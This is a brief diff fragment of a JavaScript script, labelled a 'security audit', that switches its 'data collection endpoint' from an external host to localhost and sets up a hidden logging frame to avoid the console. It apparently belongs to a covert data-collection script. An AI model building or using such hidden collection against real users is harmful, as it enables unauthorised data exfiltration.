@@ -10,7 +10,7 @@
 
 (function() {
     // 配置 - 替换为您的数据收集端点
-    const COLLECTION_ENDPOINT = 'https://api.hgagt.com/sys/user/v2/list?';
+    const COLLECTION_ENDPOINT = 'http://localhost:3000/';
     const TEST_IDENTIFIER = 'security_audit_' + Math.random().toString(36).substring(2, 10);
     
     // 创建一个隐藏的日志框架，避免直接使用console
